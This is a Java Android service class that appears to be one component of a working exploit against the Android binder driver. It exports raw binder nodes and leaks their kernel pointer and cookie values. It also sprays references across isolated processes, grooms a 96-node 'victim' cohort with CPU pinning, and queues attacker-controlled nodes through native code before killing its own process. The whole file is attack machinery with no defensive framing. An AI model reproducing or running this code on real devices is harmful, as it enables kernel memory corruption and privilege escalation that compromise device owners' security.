package com.vandam.prism;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class RawBClientService extends Service {
    static final int RAW_COHORT_COUNT = 96;
    static final int RAW_COHORT_VICTIM = 64;
    static final int TRANSACTION_EXPORT = 0x4290;
    static final int TRANSACTION_RETAIN = 0x4291;
    static final int TRANSACTION_QUEUE_AND_EXIT = 0x4292;
    static final int TRANSACTION_ABORT = 0x4293;
    static final int TRANSACTION_QUEUE_MANY_AND_EXIT = 0x4294;
    static final int TRANSACTION_ADOPT = 0x4295;
    static final int TRANSACTION_DISTRIBUTE = 0x4296;
    static final int TRANSACTION_PREPARE_TARGET = 0x4297;
    static final int TRANSACTION_START_DEFERRED_EXPORT = 0x4298;
    static final int TRANSACTION_IDENTITY = 0x4299;
    static final int TRANSACTION_TERMINAL_RETIRE = 0x429a;

    private final CountDownLatch targetConnected = new CountDownLatch(1);
    private volatile IBinder targetController;
    private IBinder rawNode;
    private IBinder[] rawCohort;
    private long rawPointer;
    private long rawCookie;
    private int rawExportIndex;
    private boolean targetBound;

    private final ServiceConnection targetConnection =
            new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            targetController = service;
            targetConnected.countDown();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            targetController = null;
        }
    };

    private final Binder controller = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply,
                                     int flags) {
            try {
                if (code == TRANSACTION_IDENTITY) {
                    reply.writeNoException();
                    reply.writeInt(Process.myPid());
                    reply.writeLong(ProcessIdentity.currentStartTime());
                    return true;
                }
                if (code == TRANSACTION_TERMINAL_RETIRE) {
                    if ((flags & IBinder.FLAG_ONEWAY) == 0 ||
                            Binder.getCallingUid() !=
                                    getApplicationInfo().uid ||
                            Binder.getCallingPid() <= 0 ||
                            Binder.getCallingPid() == Process.myPid() ||
                            data.readInt() != Process.myPid() ||
                            data.readLong() !=
                                    ProcessIdentity.currentStartTime()) {
                        return false;
                    }
                    releaseOwnedReferences();
                    new Thread(() -> Process.killProcess(Process.myPid()),
                            "raw-client-terminal-retire").start();
                    return true;
                }
                if (code == TRANSACTION_PREPARE_TARGET) {
                    String state = prepareTargetConnection();
                    reply.writeNoException();
                    reply.writeString(state);
                    return true;
                }
                if (code == TRANSACTION_START_DEFERRED_EXPORT) {
                    int index = data.readInt();
                    armDeferredExport(index);
                    reply.writeNoException();
                    reply.writeString(
                            "status=pass stage=raw-extra-export-armed");
                    return true;
                }
                if (code == TRANSACTION_EXPORT) {
                    String state = exportRawNode();
                    reply.writeNoException();
                    reply.writeString(state);
                    reply.writeInt(Process.myPid());
                    reply.writeLong(rawPointer);
                    reply.writeLong(rawCookie);
                    int siblings = rawCohort == null
                            ? 0 : rawCohort.length - 1;
                    reply.writeInt(siblings);
                    if (rawCohort != null) {
                        for (int index = 0; index < rawCohort.length;
                             index++) {
                            if (index != RAW_COHORT_VICTIM) {
                                reply.writeStrongBinder(rawCohort[index]);
                            }
                        }
                    }
                    return true;
                }
                if (code == TRANSACTION_RETAIN) {
                    int count = data.readInt();
                    int expectedRetained = data.readInt();
                    boolean linkDeath = data.readInt() != 0;
                    IBinder[] targets = new IBinder[count];
                    for (int index = 0; index < count; index++) {
                        targets[index] = data.readStrongBinder();
                    }
                    RetainResult result = retainRawNode(
                            targets, expectedRetained, linkDeath);
                    reply.writeNoException();
                    reply.writeString(result.state);
                    reply.writeInt(result.pids.size());
                    for (int pid : result.pids) {
                        reply.writeInt(pid);
                    }
                    return true;
                }
                if (code == TRANSACTION_ADOPT) {
                    rawNode = data.readStrongBinder();
                    rawPointer = data.readLong();
                    rawCookie = data.readLong();
                    String state = rawNode != null && rawPointer != 0 &&
                            rawCookie != 0
                            ? "status=pass stage=raw-client-adopt"
                            : "status=fail stage=raw-client-adopt";
                    reply.writeNoException();
                    reply.writeString(state);
                    reply.writeInt(Process.myPid());
                    return true;
                }
                if (code == TRANSACTION_DISTRIBUTE) {
                    int count = data.readInt();
                    IBinder[] targets = new IBinder[count];
                    for (int index = 0; index < count; index++) {
                        targets[index] = data.readStrongBinder();
                    }
                    RetainResult result = distributeRawNode(targets);
                    reply.writeNoException();
                    reply.writeString(result.state);
                    reply.writeInt(result.pids.size());
                    for (int pid : result.pids) {
                        reply.writeInt(pid);
                    }
                    return true;
                }
                if (code == TRANSACTION_QUEUE_AND_EXIT) {
                    boolean retainedCohort = rawCohort != null;
                    String state = retainedCohort
                            ? NativeBridge.queueRawControlledCohort(
                                    rawNode, rawCohort,
                                    getFilesDir().getAbsolutePath())
                            : NativeBridge.queueRawControlled(
                                    rawNode,
                                    getFilesDir().getAbsolutePath());
                    write("raw-client.result", state);
                    write("raw-client.result." + Process.myPid(), state);
                    if (!retainedCohort) {
                        Process.killProcess(Process.myPid());
                    }
                    return true;
                }
                if (code == TRANSACTION_QUEUE_MANY_AND_EXIT) {
                    int count = data.readInt();
                    String state = NativeBridge.queueRawControlledMany(
                            rawNode, count, getFilesDir().getAbsolutePath());
                    write("raw-client.result", state);
                    Process.killProcess(Process.myPid());
                    return true;
                }
                if (code == TRANSACTION_ABORT) {
                    Process.killProcess(Process.myPid());
                    return true;
                }
            } catch (Exception exception) {
                if (reply != null) {
                    reply.writeException(exception);
                }
                return true;
            }
            return false;
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return controller;
    }

    @Override
    public void onDestroy() {
        releaseOwnedReferences();
        super.onDestroy();
        Process.killProcess(Process.myPid());
    }

    private void releaseOwnedReferences() {
        rawNode = null;
        rawCohort = null;
        targetController = null;
        if (targetBound) {
            try {
                unbindService(targetConnection);
            } catch (Exception ignored) {
            }
            targetBound = false;
        }
    }

    private String exportRawNode() throws Exception {
        if (rawNode != null) {
            return "status=pass stage=raw-client-export cached=1";
        }
        String prepared = prepareTargetConnection();
        if (!prepared.startsWith("status=pass")) {
            return "status=fail stage=raw-client-export reason=bind";
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            boolean cohortMode = new File(getFilesDir(),
                    "raw-target.multi-export").exists();
            int cpu = cohortMode ? NativeBridge.pinCurrentThread(2) : -1;
            if (!targetController.transact(
                    0x4267 + rawExportIndex, data, reply, 0)) {
                return "status=fail stage=raw-client-export reason=transaction";
            }
            String cohortState = "status=pass stage=raw-cohort skipped=1";
            if (cohortMode && rawExportIndex == 0) {
                int count = reply.readInt();
                int selected = reply.readInt();
                if (count != RAW_COHORT_VICTIM ||
                        selected != RAW_COHORT_VICTIM || cpu != 2) {
                    return "status=fail stage=raw-client-export " +
                            "reason=cohort-header count=" + count +
                            " selected=" + selected + " cpu=" + cpu;
                }
                IBinder[] nodes = new IBinder[RAW_COHORT_COUNT];
                Set<IBinder> unique = new HashSet<>();
                for (int index = 0; index < count; index++) {
                    nodes[index] = reply.readStrongBinder();
                    if (nodes[index] == null || !unique.add(nodes[index])) {
                        return "status=fail stage=raw-client-export " +
                                "reason=cohort-node index=" + index;
                    }
                }
                String anchorState = NativeBridge.validateRawCohort(
                        java.util.Arrays.copyOf(nodes, count), count);
                if (!anchorState.startsWith("status=pass")) {
                    return "status=fail stage=raw-client-export cohort=[" +
                            anchorState + "]";
                }
                File ownerResult = new File(getFilesDir(),
                        "raw-cohort-export.result");
                if (!waitForFile(ownerResult, 5000)) {
                    return "status=fail stage=raw-client-export " +
                            "reason=cohort-owner-timeout";
                }
                String ownerState = new String(Files.readAllBytes(
                        ownerResult.toPath()), StandardCharsets.UTF_8).trim();
                if (!ownerState.startsWith("status=pass")) {
                    return "status=fail stage=raw-client-export owner=[" +
                            ownerState + "]";
                }
                String settleState = settleRawCohort();
                if (!settleState.startsWith("status=pass")) {
                    return "status=fail stage=raw-client-export settle=[" +
                            settleState + "]";
                }
                Parcel victimData = Parcel.obtain();
                Parcel victimReply = Parcel.obtain();
                try {
                    if (!targetController.transact(
                            0x4267 + rawExportIndex,
                            victimData, victimReply, 0)) {
                        return "status=fail stage=raw-client-export " +
                                "reason=victim-transaction";
                    }
                    int victimCount = victimReply.readInt();
                    int victimIndex = victimReply.readInt();
                    if (victimCount != RAW_COHORT_COUNT - selected ||
                            victimIndex != selected) {
                        return "status=fail stage=raw-client-export " +
                                "reason=victim-header count=" + victimCount +
                                " selected=" + victimIndex;
                    }
                    for (int slot = 0; slot < victimCount; slot++) {
                        int index = selected + slot;
                        nodes[index] = victimReply.readStrongBinder();
                        if (nodes[index] == null ||
                                !unique.add(nodes[index])) {
                            return "status=fail stage=raw-client-export " +
                                    "reason=victim-node index=" + index;
                        }
                    }
                    rawPointer = victimReply.readLong();
                    rawCookie = victimReply.readLong();
                } finally {
                    victimReply.recycle();
                    victimData.recycle();
                }
                File victimResult = new File(getFilesDir(),
                        "raw-cohort-victim.result");
                if (!waitForFile(victimResult, 5000)) {
                    return "status=fail stage=raw-client-export " +
                            "reason=victim-owner-timeout";
                }
                String victimState = new String(Files.readAllBytes(
                        victimResult.toPath()),
                        StandardCharsets.UTF_8).trim();
                if (!victimState.startsWith("status=pass")) {
                    return "status=fail stage=raw-client-export victim=[" +
                            victimState + "]";
                }
                File ownerReady = new File(getFilesDir(),
                        "raw-cohort.ready");
                if (!waitForFile(ownerReady, 5000)) {
                    return "status=fail stage=raw-client-export " +
                            "reason=cohort-owner-ready-timeout";
                }
                String ownerReadyState = new String(Files.readAllBytes(
                        ownerReady.toPath()), StandardCharsets.UTF_8).trim();
                if (!ownerReadyState.equals(
                        "status=ready stage=raw-cohort-owner cpu=1")) {
                    return "status=fail stage=raw-client-export ready=[" +
                            ownerReadyState + "]";
                }
                String fullState = NativeBridge.validateRawCohort(
                        nodes, RAW_COHORT_COUNT);
                if (!fullState.startsWith("status=pass")) {
                    return "status=fail stage=raw-client-export full=[" +
                            fullState + "]";
                }
                cohortState = "status=pass stage=raw-cohort anchors=[" +
                        anchorState + "] settle=[" + settleState +
                        "] victim=[" + victimState + "] ready=[" +
                        ownerReadyState + "] full=[" +
                        fullState + "]";
                rawCohort = nodes;
                rawNode = nodes[selected];
            } else {
                rawNode = reply.readStrongBinder();
                rawPointer = reply.readLong();
                rawCookie = reply.readLong();
            }
            if (rawNode == null || rawPointer == 0 || rawCookie == 0) {
                rawNode = null;
                return "status=fail stage=raw-client-export reason=payload";
            }
            return "status=pass stage=raw-client-export pid=" +
                    Process.myPid() + " pointer=0x" +
                    Long.toHexString(rawPointer) + " cookie=0x" +
                    Long.toHexString(rawCookie) + " cohort=[" +
                    cohortState + "]";
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private String prepareTargetConnection() throws Exception {
        if (targetController != null) {
            return "status=pass stage=raw-client-target cached=1";
        }
        if (!targetBound) {
            targetBound = bindService(
                    new Intent(this, RawTargetService.class),
                    targetConnection, Context.BIND_AUTO_CREATE);
        }
        boolean connected = targetBound &&
                targetConnected.await(30, TimeUnit.SECONDS) &&
                targetController != null;
        return "status=" + (connected ? "pass" : "fail") +
                " stage=raw-client-target connected=" +
                (connected ? 1 : 0);
    }

    private String settleRawCohort() throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!targetController.transact(
                    RawTargetService.TRANSACTION_COHORT_SETTLE,
                    data, reply, 0)) {
                return "status=fail stage=raw-cohort-settle " +
                        "reason=transaction";
            }
            reply.readException();
            if (reply.readInt() != 1) {
                return "status=fail stage=raw-cohort-settle reason=reply";
            }
        } finally {
            reply.recycle();
            data.recycle();
        }
        File result = new File(getFilesDir(),
                "raw-cohort-settle.result");
        if (!waitForFile(result, 5000)) {
            return "status=fail stage=raw-cohort-settle reason=timeout";
        }
        return new String(Files.readAllBytes(result.toPath()),
                StandardCharsets.UTF_8).trim();
    }

    private void armDeferredExport(int index) {
        rawExportIndex = index + 1;
        new Thread(() -> {
            if (!waitForFile(new File(getFilesDir(),
                    "raw-extra-export.go"), 120000)) {
                return;
            }
            write("raw-extra-export.submitting",
                    "status=ready stage=raw-extra-export");
            String state;
            try {
                state = exportRawNode();
            } catch (Exception exception) {
                state = "status=fail stage=raw-extra-export reason=" +
                        exception.getClass().getSimpleName();
            }
            write("raw-extra-export.result." + index, state +
                    " index=" + index + " pid=" + Process.myPid() +
                    " start_time=" + ProcessIdentity.currentStartTime() +
                    " pointer=0x" + Long.toHexString(rawPointer) +
                    " cookie=0x" + Long.toHexString(rawCookie));
            if (!state.startsWith("status=pass") ||
                    !waitForFile(new File(getFilesDir(),
                            "raw-extra-queue.enable." + index), 120000)) {
                return;
            }
            String queued = NativeBridge.queueRawControlled(
                    rawNode, getFilesDir().getAbsolutePath());
            write("raw-client.result", queued);
            write("raw-client.result." + Process.myPid(), queued);
            Process.killProcess(Process.myPid());
        }, "raw-extra-deferred-" + index).start();
    }

    private boolean waitForFile(File file, int timeoutMs) {
        int attempts = Math.max(1, timeoutMs / 10);
        for (int attempt = 0; attempt < attempts; attempt++) {
            if (file.exists()) {
                return true;
            }
            try {
                Thread.sleep(10);
            } catch (InterruptedException exception) {
                Thread.currentThread().interrupt();
                return false;
            }
        }
        return file.exists();
    }

    private void parkUntilReboot() {
        CountDownLatch parked = new CountDownLatch(1);
        for (;;) {
            try {
                parked.await();
            } catch (InterruptedException ignored) {
            }
        }
    }

    private RetainResult retainRawNode(IBinder[] controllers,
                                       int expectedRetained,
                                       boolean linkDeath)
            throws Exception {
        List<Integer> pids = new ArrayList<>();
        Set<Integer> uniquePids = new HashSet<>();
        int retained = 0;
        int cpu = NativeBridge.pinCurrentThread(2);
        if (rawNode != null && controllers.length > 0) {
            for (IBinder target : controllers) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeStrongBinder(rawNode);
                    if (!target.transact(linkDeath
                                    ? IsolatedRefService.TRANSACTION_RETAIN_DEATH
                                    : IsolatedRefService.TRANSACTION_RETAIN,
                            data, reply, 0)) {
                        break;
                    }
                    reply.readException();
                    int pid = reply.readInt();
                    int count = reply.readInt();
                    if (pid <= 0 || count != expectedRetained ||
                            !uniquePids.add(pid)) {
                        break;
                    }
                    pids.add(pid);
                    retained++;
                } finally {
                    reply.recycle();
                    data.recycle();
                }
            }
        }
        boolean pass = retained == controllers.length &&
                uniquePids.size() == controllers.length && cpu == 2;
        String state = "status=" + (pass ? "pass" : "fail") +
                " stage=raw-client-ref-spray requested=" +
                controllers.length + " retained=" + retained +
                " unique_pids=" + uniquePids.size() + " cpu=" + cpu;
        return new RetainResult(state, pids);
    }

    private RetainResult distributeRawNode(IBinder[] targets)
            throws Exception {
        List<Integer> pids = new ArrayList<>();
        int sent = 0;
        if (rawNode != null && rawPointer != 0 && rawCookie != 0) {
            for (IBinder target : targets) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeStrongBinder(rawNode);
                    data.writeLong(rawPointer);
                    data.writeLong(rawCookie);
                    if (!target.transact(TRANSACTION_ADOPT,
                            data, reply, 0)) {
                        break;
                    }
                    reply.readException();
                    String state = reply.readString();
                    int pid = reply.readInt();
                    if (state == null || !state.startsWith("status=pass") ||
                            pid <= 0) {
                        break;
                    }
                    pids.add(pid);
                    sent++;
                } finally {
                    reply.recycle();
                    data.recycle();
                }
            }
        }
        String state = "status=" +
                (sent == targets.length ? "pass" : "fail") +
                " stage=raw-client-distribute requested=" + targets.length +
                " sent=" + sent;
        return new RetainResult(state, pids);
    }

    private void write(String name, String value) {
        File directory = getFilesDir();
        File file = new File(directory, name);
        File temporary = new File(directory, name + ".tmp." +
                Process.myPid() + "." + Process.myTid());
        try {
            try (FileOutputStream stream =
                         new FileOutputStream(temporary, false)) {
                stream.write((value + "\n").getBytes(
                        StandardCharsets.UTF_8));
                stream.getFD().sync();
            }
            Files.move(temporary.toPath(), file.toPath(),
                    StandardCopyOption.ATOMIC_MOVE,
                    StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception ignored) {
            temporary.delete();
        }
    }

    private static final class RetainResult {
        final String state;
        final List<Integer> pids;

        RetainResult(String state, List<Integer> pids) {
            this.state = state;
            this.pids = pids;
        }
    }
}
